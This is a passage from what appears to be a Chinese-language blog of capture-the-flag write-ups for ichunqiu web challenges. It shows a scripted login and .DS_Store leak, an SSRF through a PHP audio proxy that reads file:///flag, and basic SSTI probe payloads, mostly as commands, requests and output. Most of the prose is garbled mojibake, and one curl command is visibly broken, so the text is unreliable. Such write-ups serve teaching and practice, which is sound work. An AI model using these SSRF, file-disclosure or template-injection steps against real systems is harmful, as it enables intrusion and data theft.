language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;login-btn&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> username = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;username&#x27;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> password = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;password&#x27;</span>).<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">fetch</span>(<span class="string">&#x27;login.php&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">headers</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span></span><br><span class="line"><span class="language-javascript">                &#125;,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">body</span>: <span class="string">`username=<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(username)&#125;</span>&amp;password=<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(password)&#125;</span>`</span></span></span><br><span class="line"><span class="language-javascript">            &#125;)</span></span><br><span class="line"><span class="language-javascript">            .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (response.<span class="property">redirected</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = response.<span class="property">url</span>;</span></span><br><span class="line"><span class="language-javascript">                &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">return</span> response.<span class="title function_">text</span>();</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;)</span></span><br><span class="line"><span class="language-javascript">            .<span class="title function_">then</span>(<span class="function"><span class="params">text</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span> (text) &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="title function_">alert</span>(text);</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;)</span></span><br><span class="line"><span class="language-javascript">            .<span class="title function_">catch</span>(<span class="function"><span class="params">error</span> =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Error:&#x27;</span>, error));</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><br/><br/><p>ç”¨POST æ–¹æ³• : </p><br/><p>$ curl -k -X POST â€œ<a href="https://eci-2ze5djxemg4v7c4t217o.cloudeci1.ichunqiu.com:80/public-555edc76-9621-4997-86b9-01483a50293e/login.php">https://eci-2ze5djxemg4v7c4t217o.cloudeci1.ichunqiu.com:80/public-555edc76-9621-4997-86b9-01483a50293e/login.php</a>â€œ<br>-d â€œusername&#x3D;adminâ€<br>-d â€œpassword&#x3D;f75cc3eb-21e0-4713-9c30-998a8edb13deâ€</p><br/><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;success&quot;:true,&quot;message&quot;:&quot;\u767b\u5f55\u6210\u529f\uff01\u6b63\u5728\u8df3\u8f6</span><br><span class="line">c...&quot;,&quot;redirectUrl&quot;:&quot;/secret-1c84a90c-d114-4acd-b799-1bc5a2b7be50/&quot;&#125;</span><br></pre></td></tr></table></figure><br/><p>{â€œsuccessâ€:true,â€messageâ€:â€ç™»å½•æˆåŠŸï¼æ­£åœ¨è·³è½¬â€¦â€,â€redirectUrlâ€:â€/secret-1c84a90c-d114-4acd-b799-1bc5a2b7be50/â€œ}</p><br/><p>å› ç‚ºæ˜¯Macå¯«çš„, æ‰€ä»¥ä¸‹è¼‰.DS_Storeæ–‡ä»¶ </p><br/><p><a href="https://eci-2zeafbv6ennhj2jnf7ju.cloudeci1.ichunqiu.com:80/secret-1c84a90c-d114-4acd-b799-1bc5a2b7be50/.DS_Store">https://eci-2zeafbv6ennhj2jnf7ju.cloudeci1.ichunqiu.com:80/secret-1c84a90c-d114-4acd-b799-1bc5a2b7be50/.DS_Store</a></p><br/><img src="01a84e73620b7e076af0265f586f97bb.png" alt="2b3abbe0-a5fb-4d11-908b-6bb31f49d3e5.png"  /><br/><br/><p>$ python3 ds_store_exp.py<a href="https://eci-2ze5djxemg4v7c4t217o.cloudeci1.ichunqiu.com:80/secret-1c84a90c-d114-4acd-b799-1bc5a2b7be50/.DS_Store">https://eci-2ze5djxemg4v7c4t217o.cloudeci1.ichunqiu.com:80/secret-1c84a90c-d114-4acd-b799-1bc5a2b7be50/.DS_Store</a></p><br/><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[200] https://eci-2zeafbv6ennhj2jnf7ju.cloudeci1.ichunqiu.com:80/secret-1c84a90c-d114-4acd-b799-1bc5a2b7be50/.DS_Store</span><br><span class="line">[200] https://eci-2zeafbv6ennhj2jnf7ju.cloudeci1.ichunqiu.com:80/secret-1c84a90c-d114-4acd-b799-1bc5a2b7be50/ffffllllaaaagggg114514</span><br></pre></td></tr></table></figure><br/><br/><p>$ BASE_URL&#x3D;â€<a href="https://eci-2zeafbv6ennhj2jnf7ju.cloudeci1.ichunqiu.com:80/secret-1c84a90c-d114-4acd-b799-1bc5a2b7be50">https://eci-2zeafbv6ennhj2jnf7ju.cloudeci1.ichunqiu.com:80/secret-1c84a90c-d114-4acd-b799-1bc5a2b7be50</a>â€œ<br>FILENAME&#x3D;â€ffffllllaaaagggg114514â€</p><br/><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;--- Retrieving the Flag ---&quot;</span><br><span class="line">curl -k &quot;$BASE_URL/$BASEURL/BASE_URL/</span><br><span class="line">BASEUâ€‹RL/FILENAME&quot;</span><br><span class="line">--- Retrieving the Flag ---</span><br><span class="line">flag&#123;2ba897a9-1533-432c-9d66-970200498634&#125;</span><br></pre></td></tr></table></figure><br/><h2 id="2-mygo"><a href="#2-mygo" class="headerlink" title="2.mygo!!!"></a>2.mygo!!!</h2><p>çœ‹çœ‹html </p><br/><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width,initial-scale=1&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>MyGo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-pseudo">:root</span>&#123;</span></span><br><span class="line"><span class="language-css">      <span class="attr">--gap</span>: <span class="number">18px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attr">--btn-width</span>: <span class="number">220px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attr">--btn-padding</span>: <span class="number">12px</span> <span class="number">18px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attr">--btn-radius</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    *&#123;<span class="attribute">box-sizing</span>:border-box&#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">html</span>,<span class="selector-tag">body</span>&#123;<span class="attribute">height</span>:<span class="number">100%</span>;<span class="attribute">margin</span>:<span class="number">0</span>&#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">body</span>&#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">font-family</span>: -apple-system, BlinkMacSystemFont, <span class="string">&quot;Segoe UI&quot;</span>, Roboto, <span class="string">&quot;Helvetica Neue&quot;</span>, Arial;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">min-height</span>:<span class="number">100vh</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&#x27;mygo.jpg&#x27;</span>);</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background-size</span>: cover;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background-position</span>: center;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background-repeat</span>: no-repeat;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">display</span>:flex;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">align-items</span>:center;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">justify-content</span>:center;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.layout</span>&#123;<span class="attribute">width</span>:<span class="number">100%</span>;<span class="attribute">max-width</span>:<span class="number">1100px</span>;<span class="attribute">padding</span>:<span class="number">40px</span>;<span class="attribute">display</span>:flex;<span class="attribute">justify-content</span>:space-between;<span class="attribute">align-items</span>:center;&#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.col</span>&#123;<span class="attribute">display</span>:flex;<span class="attribute">flex-direction</span>:column;<span class="attribute">gap</span>:<span class="built_in">var</span>(--gap);<span class="attribute">align-items</span>:flex-start;<span class="attribute">width</span>:<span class="built_in">calc</span>(<span class="built_in">var</span>(--btn-width) + <span class="number">10px</span>);&#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.col</span><span class="selector-class">.right</span>&#123;<span class="attribute">align-items</span>:flex-end&#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.ghost-btn</span>&#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">width</span>:<span class="built_in">var</span>(--btn-width);</span></span><br><span class="line"><span class="language-css">      <span class="attribute">padding</span>:<span class="built_in">var</span>(--btn-padding);</span></span><br><span class="line"><span class="language-css">      <span class="attribute">border-radius</span>:<span class="built_in">var</span>(--btn-radius);</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background</span>:transparent;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">color</span>:<span class="number">#007BFF</span>; <span class="comment">/* è“è‰²æ–‡å­— */</span></span></span><br><span class="line"><span class="language-css">      <span class="attribute">border</span>:<span class="number">2px</span> solid <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.08</span>);</span></span><br><span class="line"><span class="language-css">      <span class="attribute">font-size</span>:<span class="number">16px</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">font-weight</span>:<span class="number">600</span>;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">text-align</span>:center;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">cursor</span>:pointer;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">transition</span>:transform .<span class="number">16s</span> ease, box-shadow .<span class="number">16s</span> ease, background-color .<span class="number">16s</span> ease;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-class">.ghost-btn</span><span class="selector-pseudo">:hover</span>&#123;</span></span><br><span class="line"><span class="language-css">      <span class="attribute">transform</span>:<span class="built_in">translateY</span>(-<span class="number">4px</span>);</span></span><br><span class="line"><span class="language-css">      <span class="attribute">box-shadow</span>:<span class="number">0</span> <span class="number">8px</span> <span class="number">20px</span> <span class="built_in">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.08</span>);</span></span><br><span class="line"><span class="language-css">      <span class="attribute">background-color</span>: <span class="built_in">rgba</span>(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">0.02</span>);</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="keyword">@media</span> (<span class="attribute">max-width</span>:<span class="number">720px</span>)&#123;</span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.layout</span>&#123;<span class="attribute">flex-direction</span>:column;<span class="attribute">gap</span>:<span class="number">24px</span>;<span class="attribute">padding</span>:<span class="number">22px</span>&#125;</span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.col</span>&#123;<span class="attribute">width</span>:<span class="number">100%</span>;<span class="attribute">align-items</span>:center&#125;</span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.col</span><span class="selector-class">.right</span>&#123;<span class="attribute">align-items</span>:center&#125;</span></span><br><span class="line"><span class="language-css">      <span class="selector-class">.ghost-btn</span>&#123;<span class="attribute">width</span>:<span class="number">100%</span>;<span class="attribute">max-width</span>:<span class="number">420px</span>&#125;</span></span><br><span class="line"><span class="language-css">    &#125;</span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">audio</span>&#123;<span class="attribute">display</span>:block;<span class="attribute">margin-top</span>:<span class="number">20px</span>;<span class="attribute">width</span>:<span class="number">100%</span>;&#125;</span></span><br><span class="line"><span class="language-css">  </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">main</span> <span class="attr">class</span>=<span class="string">&quot;layout&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">&quot;col left&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;ghost-btn&quot;</span> <span class="attr">data-url</span>=<span class="string">&quot;http://localhost/chunriying.mp3&quot;</span>&gt;</span>æ˜¥æ—¥å½±<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;ghost-btn&quot;</span> <span class="attr">data-url</span>=<span class="string">&quot;http://localhost/mixingjiao.mp3&quot;</span>&gt;</span>è¿·æ˜Ÿå«<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">&quot;col right&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;ghost-btn&quot;</span> <span class="attr">data-url</span>=<span class="string">&quot;http://localhost/shichaoban.mp3&quot;</span>&gt;</span>è¯—è¶…ç»Š<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;ghost-btn&quot;</span> <span class="attr">data-url</span>=<span class="string">&quot;http://localhost/???&quot;</span>&gt;</span>flag<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">main</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!-- éšè—æ’­æ”¾å™¨ï¼Œç‚¹å‡»æŒ‰é’®æ—¶èµ‹å€¼ --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">audio</span> <span class="attr">id</span>=<span class="string">&quot;player&quot;</span> <span class="attr">controls</span> <span class="attr">autoplay</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> player = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;player&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.ghost-btn&#x27;</span>).<span class="title function_">forEach</span>(<span class="function"><span class="params">btn</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      btn.<span class="title function_">addEventListener</span>(<span class="string">&#x27;click&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">const</span> url = btn.<span class="title function_">getAttribute</span>(<span class="string">&#x27;data-url&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// é€šè¿‡ PHP ä»£ç†æ’­æ”¾</span></span></span><br><span class="line"><span class="language-javascript">        player.<span class="property">src</span> = <span class="string">`index.php?proxy=<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(url)&#125;</span>`</span>;</span></span><br><span class="line"><span class="language-javascript">        player.<span class="title function_">play</span>();</span></span><br><span class="line"><span class="language-javascript">      &#125;);</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><br/><p>å¯ä»¥çœ‹è¦‹å®ƒä¸æ˜¯ç›´æ¥æ’­æ”¾ URLï¼Œè€Œæ˜¯å°† URL ä½œä¸ºå‚æ•°ä¼ é€’ç»™ index.php (player.src &#x3D; \index.php?proxy&#x3D;${encodeURIComponent(url)}<code>;</code>)ï¼Œè¿™æš—ç¤ºç€éŸ³é¢‘æµæ˜¯é€šè¿‡æœåŠ¡å™¨ç«¯çš„ PHP è„šæœ¬è¿›è¡Œä»£ç†ä¼ è¾“çš„ã€‚</p><br/><p>ç”¨BPæŠ“ä¸€ä¸‹åŒ…:</p><br/><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?proxy=http%3A%2F%2Flocalhost%2F%3F%3F%3F HTTP/2</span><br><span class="line">Host: eci-2zeiq1qx3sfyqqirtd7z.cloudeci1.ichunqiu.com:80</span><br><span class="line">Sec-Ch-Ua-Platform: &quot;Windows&quot;</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-TW,zh;q=0.9</span><br><span class="line">Sec-Ch-Ua: &quot;Chromium&quot;;v=&quot;139&quot;, &quot;Not;A=Brand&quot;;v=&quot;99&quot;</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36</span><br><span class="line">Sec-Ch-Ua-Mobile: ?0</span><br><span class="line">Accept: /</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: no-cors</span><br><span class="line">Sec-Fetch-Dest: audio</span><br><span class="line">Referer: https://eci-2zeiq1qx3sfyqqirtd7z.cloudeci1.ichunqiu.com:80/</span><br><span class="line">Range: bytes=0-</span><br><span class="line">Priority: i</span><br></pre></td></tr></table></figure><br/><p>çš„ç¢ºæ˜¯proxy</p><br/><p>dirsearchä¸€ä¸‹</p><br/><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">|. _ _ _ _ _ | v0.4.3</span><br><span class="line">(||| ) (/(|| (| )</span><br><span class="line"></span><br><span class="line">Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12292</span><br><span class="line"></span><br><span class="line">Target: https://eci-2zeiq1qx3sfyqqirtd7z.cloudeci1.ichunqiu.com:80/</span><br><span class="line"></span><br><span class="line">[09:18:06] Scanning:</span><br><span class="line">[09:19:05] 403 - 38B - /flag.php</span><br><span class="line">[09:19:10] 200 - 3KB - /index.php</span><br><span class="line">[09:19:10] 200 - 3KB - /index.php/login/</span><br><span class="line">[09:19:34] 403 - 312B - /server-status</span><br><span class="line">[09:19:34] 403 - 312B - /server-status/</span><br><span class="line"></span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure><br/><p>æœ‰ä¸€å€‹flag.php</p><br/><img src="eef6283bbaa5b1bf05dbb642589d50c3.png" alt="eef6283bbaa5b1bf05dbb642589d50c3.png"  /><br/><p>æœ¬åœ°äºº ,</p><br/><p><a href="http://localhost/flag.php?soyorin=file:///flag">http://localhost/flag.php?soyorin=file:///flag</a></p><br/><img src="5e80bf943bdc6fb11ea69ad802928d44.png" alt="5e80bf943bdc6fb11ea69ad802928d44.png"  /><h2 id="whoâ€™ssti-å‘³å¤åˆ»"><a href="#whoâ€™ssti-å‘³å¤åˆ»" class="headerlink" title="whoâ€™ssti(å‘³å¤åˆ»)"></a>whoâ€™ssti(å‘³å¤åˆ»)</h2><p><strong>æœ¬é¢˜è€ƒæŸ¥äº†é€‰æ‰‹å¯¹äº SSTI æœ€åŸºç¡€çš„æ„é€ æ–¹æ³•ã€‚</strong></p><p>æ‰“é–‹WSL æ‰“é–‹æ–‡ä»¶ç”¨docker run è£¹é¢çš„docker file </p><img src="5dc1b66533335599de7cedd700e9f654.png" alt="5dc1b66533335599de7cedd700e9f654.png"  /><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker build -t who-ssti .</span><br><span class="line">docker images</span><br><span class="line">docker run -d -p 5000:5000 --name ssti-app who-ssti</span><br></pre></td></tr></table></figure><img src="1d5a59f46d8edf5ae9447dba628bd1e6.png" alt="1d5a59f46d8edf5ae9447dba628bd1e6.png"  /><p>æˆåŠŸåœ¨æœ¬åœ°å»ºç«‹äº†ç¶²ç«™äº†</p><h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><p>å°å¼Ÿç¬¬ä¸€æ¬¡åšé€™å€‹SSTIæ³¨å…¥, é›¶åŸºç¤ , ç”¨äº†ä¸€å¤©å¿«é€Ÿå…¥é–€flask , é‚„æ˜¯ä¸æ˜¯å¾ˆæ‡‚(æœ¬äººæ˜¯çŒªé¼»)</p><p>å•äº†å•dè€å¸«: </p><hr><p>æƒ³è±¡ä¸€ä¸‹ï¼Œä½ æ˜¯ä¸€ä¸ªç½‘ç«™çš„å¼€å‘è€…ã€‚ä½ å¸Œæœ›ç½‘ç«™çš„æŸäº›é¡µé¢èƒ½å¤ŸåŠ¨æ€åœ°æ˜¾ç¤ºç”¨æˆ·çš„åå­—ã€‚æ¯”å¦‚ï¼Œç”¨æˆ· å°æ˜ ç™»å½•åï¼Œé¡µé¢ä¸Šä¼šæ˜¾ç¤º â€œæ¬¢è¿ä½ ï¼Œå°æ˜ï¼â€ã€‚</p><p>ä½ æ˜¯æ€ä¹ˆåšåˆ°çš„å‘¢ï¼Ÿä½ å¯èƒ½ä¼šå†™ä¸€ä¸ªæ¨¡æ¿ï¼Œå°±åƒå¡«ç©ºä¸€æ ·ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>æ¬¢è¿ä½ ï¼Œ&#123;% raw %&#125;&#123;&#123; ç”¨æˆ·å &#125;&#125;&#123;% endraw %&#125;ï¼<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å½“æœåŠ¡å™¨å¤„ç†è¿™ä¸ªé¡µé¢æ—¶ï¼Œå®ƒä¼šçœ‹åˆ° {{ ... }}ï¼Œå°±çŸ¥é“è¿™é‡Œéœ€è¦ä¸€ä¸ªå˜é‡ã€‚å®ƒä¼šæ‰¾åˆ°å½“å‰ç™»å½•çš„ç”¨æˆ·åï¼ˆæ¯”å¦‚â€œå°æ˜â€ï¼‰ï¼Œç„¶åæŠŠè¿™ä¸ªâ€œç©ºâ€å¡«ä¸Šï¼Œæœ€ç»ˆç”Ÿæˆä¸€ä¸ªå®Œæ•´çš„ HTML å‘é€ç»™ç”¨æˆ·çš„æµè§ˆå™¨ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>æ¬¢è¿ä½ ï¼Œå°æ˜ï¼<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªè¿‡ç¨‹å°±å«åš æœåŠ¡å™¨ç«¯æ¨¡æ¿æ¸²æŸ“ã€‚</p><hr><p>æ¢æµ‹æ˜¯å¦å­˜åœ¨ SSTI:</p><p>ä¸åŒçš„æ¨¡æ¿å¼•æ“è¯­æ³•ç•¥æœ‰ä¸åŒï¼Œä½ ä¹Ÿå¯ä»¥è¯•è¯• :</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% raw %&#125;&#123;&#123; 7*7 &#125;&#125;&#123;% endraw %&#125;ï¼Œ &#123;$ 7*7 $&#125;ï¼Œ &lt;%= 7*7 %&gt;</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªå¸¸è§çš„æ–¹æ³•æ˜¯ä½¿ç”¨ä¸€ä¸ªä¼šæŠ¥é”™çš„ payloadï¼Œä»é”™è¯¯ä¿¡æ¯ä¸­åˆ¤æ–­</p><p>è¾“å…¥ï¼š {{ â€œâ€ }}</p><p>è§‚å¯Ÿé”™è¯¯ä¿¡æ¯ï¼š å¦‚æœé”™è¯¯ä¿¡æ¯é‡Œæåˆ°äº† â€œJinja2â€ï¼Œé‚£å¾ˆå¯èƒ½å°±æ˜¯ Python çš„ Jinja2 å¼•æ“ã€‚å¦‚æœæåˆ°äº† â€œTwigâ€ï¼Œå¯èƒ½å°±æ˜¯ PHP çš„ Twigã€‚</p><h1 id="Week4"><a href="#Week4" class="headerlink" title="Week4"></a>Week4</h1><h2 id="å°ç¾Šèµ°è¿·å®«"><a href="#å°ç¾Šèµ°è¿·å®«" class="headerlink" 